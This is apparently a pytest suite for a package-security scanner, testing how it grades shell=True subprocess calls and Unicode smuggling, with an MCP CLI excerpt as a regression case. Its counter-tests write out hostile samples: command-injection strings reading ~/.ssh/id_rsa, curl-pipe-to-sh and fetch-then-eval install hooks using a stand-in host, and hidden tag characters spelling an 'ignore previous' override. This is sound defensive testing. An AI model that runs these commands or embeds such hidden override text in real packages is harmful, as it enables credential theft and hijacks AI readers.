"""Static-precision PR 2 (docs/internal/precision-pass-scope-2026-10-07.md §5).

Pins:

* the founder-approved ``shell=True`` calibration (tracked follow-up #2): a constant,
  metacharacter-free argv, or argv from the program's OWN command line, is a medium
  defect; metacharacters, ``sh -c``, downloaders, URLs, string commands and untrusted
  input nearby keep today's high / critical — with ``pypi/mcp`` 2.3.0 ``cli/cli.py`` as
  the pinned regression case;
* each false-positive class the 400-package corpus exposed, each with its known-bad
  counter-test (the same shape that must still fire).
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file
from src.scanner.artifact_scan import detect_pypi_install_exec, scan_artifact_files
from src.scanner.scan import _scan_content, _scan_install_hooks


def _scan(code: str, path: str = "tool.py"):
    findings, _, _ = _scan_content(code, path)
    return findings


def _exec(findings):
    return [f for f in findings if f.category == "unsafe_exec"]


def _exec_defects(findings):
    return [f for f in _exec(findings) if f.kind == "defect"]


def _one_exec_defect(code: str, path: str = "tool.py"):
    d = _exec_defects(_scan(code, path))
    assert len(d) == 1, [(f.name, f.severity, f.line_number) for f in _exec(_scan(code, path))]
    return d[0]


# ── shell=True calibration ─────────────────────────────────────────────────────

class TestShellTrueCalibration:
    @pytest.mark.parametrize("code", [
        'subprocess.run(["git", "status"], shell=True)\n',
        'subprocess.run(("npx.cmd", "--version"), check=True, shell=True)\n',
        'CMD = ["where", "node"]\nsubprocess.check_output(CMD, shell=True)\n',
        'cmd = ["git", "log", "-1"]\nsubprocess.Popen(cmd, shell=True)\n',
    ])
    def test_constant_metachar_free_argv_is_medium(self, code):
        f = _one_exec_defect(code)
        assert f.severity == "medium", f.remediation
        assert "constant argv" in f.remediation

    def test_loop_variable_over_a_constant_list_is_constant(self):
        code = (
            "def probe():\n"
            "    for cmd in [\"npx.cmd\", \"npx.exe\", \"npx\"]:\n"
            "        subprocess.run([cmd, \"--version\"], check=True, capture_output=True,"
            " shell=True)\n"
        )
        assert _one_exec_defect(code).severity == "medium"

    def test_typer_command_argv_is_medium(self):
        code = (
            "import subprocess\nimport typer\napp = typer.Typer()\n\n"
            "@app.command()\n"
            "def dev(\n    file_spec: str = typer.Argument(...),\n) -> None:\n"
            "    uv_cmd = build(file_spec)\n"
            "    npx_cmd = find_npx()\n"
            "    shell = sys.platform == \"win32\"\n"
            "    try:\n"
            "        subprocess.run(\n"
            "            [npx_cmd, \"@modelcontextprotocol/inspector\"] + uv_cmd,\n"
            "            check=True,\n            shell=shell,\n        )\n"
            "    except OSError:\n        pass\n"
        )
        f = _one_exec_defect(code)
        assert f.severity == "medium" and "own command line" in f.remediation

    def test_argparse_main_argv_is_medium(self):
        code = (
            "import argparse, subprocess\n\n"
            "def main():\n"
            "    parser = argparse.ArgumentParser()\n"
            "    parser.add_argument('path')\n"
            "    args = parser.parse_args()\n"
            "    subprocess.run(['tool', args.path], shell=True)\n"
        )
        assert _one_exec_defect(code).severity == "medium"

    @pytest.mark.parametrize("code,floor", [
        # metacharacters in a constant argv: the shell runs a second command
        ('subprocess.run(["ls", ";", "cat ~/.ssh/id_rsa"], shell=True)\n', "high"),
        ('subprocess.run(["echo", "$(whoami)"], shell=True)\n', "high"),
        ('subprocess.run(["a", "|", "b"], shell=True)\n', "high"),
        ('subprocess.run(["x", "`id`"], shell=True)\n', "high"),
        ('subprocess.run(["out", ">", "/etc/passwd"], shell=True)\n', "high"),
        # shells, inline interpreters, downloaders, URLs
        ('subprocess.run(["sh", "-c", "ls"], shell=True)\n', "high"),
        ('subprocess.run(["python", "-c", "print(1)"], shell=True)\n', "high"),
        ('subprocess.run(["curl", "-O", "file"], shell=True)\n', "high"),
        ('subprocess.run(["pip", "install", "https://x.example/p.tgz"], shell=True)\n', "high"),
        # a string command is still a shell string
        ('subprocess.run("git status", shell=True)\n', "high"),
        # dynamic argv OUTSIDE a CLI entry point
        ('def f(name):\n    subprocess.run(["convert", name], shell=True)\n', "high"),
    ])
    def test_shell_forms_outside_the_calibration_stay(self, code, floor):
        f = _one_exec_defect(code)
        assert f.severity in (("critical", "high") if floor == "high" else ("critical",)), (
            code, f.severity)

    def test_cli_argv_next_to_untrusted_input_stays_critical(self):
        code = (
            "import subprocess\nimport click\n\n"
            "@click.command()\n"
            "def run(target):\n"
            "    body = request.json\n"
            "    subprocess.run(['scan', body['host']], shell=True)\n"
        )
        assert _one_exec_defect(code).severity == "critical"

    def test_constant_argv_next_to_untrusted_input_is_not_calibrated(self):
        # Untrusted input nearby: no calibration — today's verdict (critical) is unchanged.
        code = "data = requests.get(u).json()\nsubprocess.run(['git', 'status'], shell=True)\n"
        assert _one_exec_defect(code).severity == "critical"

    def test_cli_argv_bound_to_a_decoded_payload_stays_high(self):
        code = (
            "import base64, subprocess\nimport typer\napp = typer.Typer()\n\n"
            "@app.command()\n"
            "def go() -> None:\n"
            "    payload = base64.b64decode(BLOB).decode()\n"
            "    subprocess.run([payload], shell=True)\n"
        )
        d = _exec_defects(_scan(code))
        assert d and all(f.severity in ("high", "critical") for f in d), [
            (f.name, f.severity) for f in d]

    def test_bot_command_decorator_is_not_a_cli(self):
        # discord.py-style `@bot.command` takes arguments from chat users, not the CLI.
        code = (
            "import subprocess\nfrom discord.ext import commands\n\n"
            "@bot.command()\n"
            "async def ping(ctx, host):\n"
            "    subprocess.run(['ping', host], shell=True)\n"
        )
        assert _one_exec_defect(code).severity == "high"


# ── pinned regression: pypi/mcp 2.3.0 src/mcp/cli/cli.py ───────────────────────

# Verbatim excerpt (MIT, modelcontextprotocol/python-sdk) of the two shell=True calls:
# :48 probes npx.cmd / npx.exe / npx with a constant argv; :276 runs the MCP Inspector
# with the dev's own typer arguments (`mcp dev server.py`).
MCP_CLI_EXCERPT = '''"""MCP CLI tools."""

import importlib.metadata
import os
import subprocess
import sys
from pathlib import Path
from typing import Annotated, Any

try:
    import typer
except ImportError:  # pragma: no cover
    print("Error: typer is required. Install with 'pip install mcp[cli]'")
    sys.exit(1)

app = typer.Typer(name="mcp", help="MCP development tools", add_completion=False)


def _get_npx_command():
    """Get the correct npx command for the current platform."""
    if sys.platform == "win32":
        # Try both npx.cmd and npx.exe on Windows
        for cmd in ["npx.cmd", "npx.exe", "npx"]:
            try:
                subprocess.run([cmd, "--version"], check=True, capture_output=True, shell=True)
                return cmd
            except subprocess.CalledProcessError:
                continue
        return None
    return "npx"  # On Unix-like systems, just use npx


@app.command()
def dev(
    file_spec: str = typer.Argument(
        ...,
        help="Python file to run, optionally with :object suffix",
    ),
    with_packages: Annotated[
        list[str],
        typer.Option(
            "--with",
            help="Additional packages to install",
        ),
    ] = [],
) -> None:  # pragma: no cover
    """Run an MCP server with the MCP Inspector."""
    file, server_object = _parse_file_path(file_spec)
    try:
        uv_cmd = _build_uv_command(file_spec, None, with_packages)

        # Get the correct npx command
        npx_cmd = _get_npx_command()
        if not npx_cmd:
            sys.exit(1)

        # Run the MCP Inspector command with shell=True on Windows
        shell = sys.platform == "win32"
        process = subprocess.run(
            [npx_cmd, "@modelcontextprotocol/inspector"] + uv_cmd,
            check=True,
            shell=shell,
            env=dict(os.environ.items()),  # Copy the environment for subprocess launch
        )
        sys.exit(process.returncode)
    except subprocess.CalledProcessError as e:
        sys.exit(e.returncode)
'''


class TestMcpRegression:
    def test_both_shell_true_calls_are_medium(self):
        d = _exec_defects(_scan(MCP_CLI_EXCERPT, "src/mcp/cli/cli.py"))
        assert [(f.severity) for f in d] == ["medium", "medium"], [
            (f.line_number, f.severity, f.remediation) for f in d]
        assert "constant argv" in d[0].remediation
        assert "own command line" in d[1].remediation

    def test_corpus_snapshot_reads_safe(self):
        exp = json.loads((Path(__file__).parent / "corpus/static/expected.json").read_text())
        mcp = exp["packages"]["pypi/mcp"]
        assert mcp["version"] == "2.3.0"
        assert mcp["label"] == "safe"
        assert mcp["severity"]["critical"] == 0 and mcp["severity"]["high"] == 0


# ── false-positive classes from the corpus, each with its counter-test ─────────

class TestRawShellTrueRule:
    def test_text_inside_a_string_is_not_a_kwarg(self):
        code = 'raise ValueError("shell=True requires `cmd` to be a shell command string")\n'
        assert not _exec(_scan(code))

    def test_own_kwarg_named_in_shell_is_not_shell(self):
        assert not _exec(_scan("callit(cmd=[c], show_stdout=v, in_shell=True)\n"))

    def test_wrapper_call_with_shell_true_is_high_not_critical(self):
        code = ("process = await trio.lowlevel.open_process(\n    convert_item(command),\n"
                "    shell=True,\n)\n")
        d = _exec_defects(_scan(code))
        assert [f.severity for f in d] == ["high"]

    def test_wrapper_call_next_to_untrusted_input_stays_critical(self):
        code = "cmd = request.json['cmd']\np = Popen(cmd, shell=True)\n"
        d = _exec_defects(_scan(code))
        assert d and d[0].severity == "critical"

    def test_check_call_goes_through_the_classifier(self):
        f = _one_exec_defect("subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n")
        assert f.severity == "high"


class TestListConcatenation:
    @pytest.mark.parametrize("code", [
        "subprocess.call([str(executable_path)] + args)\n",
        "subprocess.check_output(shlex.split(cc) + ['-dumpmachine'])\n",
        "subprocess.run(['git', 'add'] + files)\n",
    ])
    def test_list_concat_without_shell_is_a_capability(self, code):
        assert not _exec_defects(_scan(code))
        assert _exec(_scan(code))[0].kind == "capability"

    @pytest.mark.parametrize("code", [
        "subprocess.call(['sh', str(path)] + args)\n",
        "subprocess.run(['bash', '-c'] + [script])\n",
        "subprocess.run('ls ' + user_dir)\n",
        "subprocess.run('%s --x' % tool)\n",
    ])
    def test_shell_or_string_concat_stays_a_defect(self, code):
        d = _exec_defects(_scan(code))
        assert d and d[0].severity in ("high", "critical"), code

    def test_long_concat_chain_is_linear(self):
        chain = " + ".join(f"'p{i}'" for i in range(300))
        _scan(f"subprocess.run({chain})\n")  # must return promptly, no RecursionError


class TestOsSystemNoop:
    def test_empty_os_system_is_a_capability(self):
        f = _exec(_scan('os.system("")\n'))
        assert f and f[0].kind == "capability" and f[0].severity == "info"

    def test_real_os_system_stays_high(self):
        assert _one_exec_defect('os.system("rm -rf build")\n').severity == "high"


class TestJsLocalExec:
    @pytest.mark.parametrize("code", [
        # wrap-ansi: a local line-wrapping function named exec
        "const exec = (string, columns, options = {}) => string;\n"
        "export default function wrap(s) { return s.split('\\n').map(l => exec(l)).join(''); }\n",
        # json5 / core-js: exec as a callback parameter
        "var _fails = function (exec) {\n  try {\n    return !!exec();\n  } catch (e) {}\n};\n",
        # get-intrinsic: `$exec` is a bound RegExp.prototype.exec
        "var $exec = bind.call(Function.call, RegExp.prototype.exec);\n"
        "if ($exec(/^%?[^%]*%?$/, name) === null) { throw new Error('x'); }\n",
    ])
    def test_local_exec_is_not_child_process(self, code):
        assert not _exec(_scan(code, "index.js"))

    @pytest.mark.parametrize("code", [
        "const { exec } = require('child_process');\nexec(cmd);\n",
        "const exec = require('child_' + 'process').exec;\nexec(cmd);\n",
        "exec(userCommand);\n",  # no local definition: could be a re-export
    ])
    def test_child_process_exec_still_fires(self, code):
        d = _exec_defects(_scan(code, "index.js"))
        assert d and d[0].severity in ("high", "critical"), code


class TestDeclarationFiles:
    def test_dts_signatures_are_not_calls(self):
        code = ("export function execSync(command: string): Buffer;\n"
                "export function spawn(command: string, args?: string[]): ChildProcess;\n")
        assert not _exec(_scan(code, "child_process.d.ts"))

    def test_same_text_in_ts_source_still_fires(self):
        assert _exec_defects(_scan("execSync(`git ${cmd}`);\n", "index.ts"))

    def test_dts_still_scans_hidden_unicode(self):
        code = 'export const DESC = "run\u200bnow";\n'
        assert any(f.category == "hidden_unicode" for f in _scan(code, "types.d.ts"))


class TestSetupPyReceivers:
    @pytest.mark.parametrize("call", [
        "super().run()", "build_ext.run(self)", "_build_py.run(self)", "build_cmd.run()",
        "platform.system()",
    ])
    def test_setuptools_and_platform_calls_are_not_exec(self, call):
        src = f"import platform\nclass B(build_ext):\n    def run(self):\n        {call}\n"
        assert not [f for f in detect_pypi_install_exec(src, "setup.py")
                    if f.name.startswith("setup.py executes")]

    @pytest.mark.parametrize("call,sev", [
        ("os.system('make')", "high"),
        ("__import__('os').system('make')", "high"),
        ("subprocess.run(cmd)", "high"),
        ("urlopen('https://x.example/p').read()", "critical"),
    ])
    def test_real_install_exec_still_fires(self, call, sev):
        src = f"import os, subprocess\nfrom urllib.request import urlopen\n{call}\n"
        f = detect_pypi_install_exec(src, "setup.py")
        assert f and f[0].severity == sev

    def test_only_the_root_setup_py_is_the_install_hook(self):
        fetched = ArtifactFetchResult(ecosystem="pypi", name="p", version="1", kind="sdist",
                                      ok=True)
        hook = "import os\nos.system('make')\n"
        for path in ("setup.py", "tests/minimext/setup.py", "lib-rt/setup.py"):
            fetched.files[path] = _make_file(path, hook.encode())
        findings, _n, has_hook = scan_artifact_files(fetched)
        hooks = [f for f in findings if f.category == "install_hook"]
        assert has_hook and [f.file_path for f in hooks] == ["setup.py"]


class TestUnicodeData:
    def test_emoji_flag_tag_sequence_is_data(self):
        england = "\U0001F3F4\U000E0067\U000E0062\U000E0065\U000E006E\U000E0067\U000E007F"
        assert not [f for f in _scan(f"FLAGS = {{'{england}': 2}}\n")
                    if f.category == "hidden_unicode"]

    @pytest.mark.parametrize("payload", [
        # ASCII smuggled as tag characters ("IGNORE"), no flag base
        "".join(chr(0xE0000 + ord(c)) for c in "IGNORE"),
        # a flag base followed by UPPERCASE tag letters is not a valid tag sequence
        "\U0001F3F4" + "".join(chr(0xE0000 + ord(c)) for c in "RUN") + "\U000E007F",
    ])
    def test_smuggled_tags_still_critical(self, payload):
        f = [x for x in _scan(f'desc = "ok{payload}"\n') if x.category == "hidden_unicode"]
        assert f and f[0].severity == "critical"

    @pytest.mark.parametrize("text", [
        "\U0001F468‍\U0001F469‍\U0001F467",   # family ZWJ sequence
        "\U0001F642‍↔️",                  # head shaking horizontally
        "ക്‍",                            # Malayalam virama + ZWJ (chillu)
        "ن‌م",                            # Persian ZWNJ between letters
    ])
    def test_typographic_joiners_are_data(self, text):
        assert not [f for f in _scan(f"T = '{text}'\n") if f.category == "hidden_unicode"]

    @pytest.mark.parametrize("text", ["ig‍nore previous", "a​b", "x⁠y"])
    def test_joiners_between_latin_letters_still_fire(self, text):
        assert [f for f in _scan(f"T = '{text}'\n") if f.category == "hidden_unicode"]


class TestInstallHookInlineNode:
    def _hook(self, cmd: str):
        return _scan_install_hooks(json.dumps({"scripts": {"postinstall": cmd}}),
                                   "package.json")

    def test_constant_inert_node_e_fallback_is_medium(self):
        f = self._hook('node dist/track.js || node -e "process.exit(0)"')
        assert [x.severity for x in f] == ["medium"]

    @pytest.mark.parametrize("cmd", [
        "node -e \"require('child_process').exec('id')\"",
        "node -e \"fetch('https://x.example').then(r => r.text()).then(eval)\"",
        'node -e "$(curl -s https://x.example/p)"',
        "curl -s https://x.example/i.sh | sh",
        "node -e \"Buffer.from(p, 'base64')\" && eval x",
    ])
    def test_dangerous_hooks_stay_critical(self, cmd):
        f = self._hook(cmd)
        assert f and f[0].severity == "critical", cmd
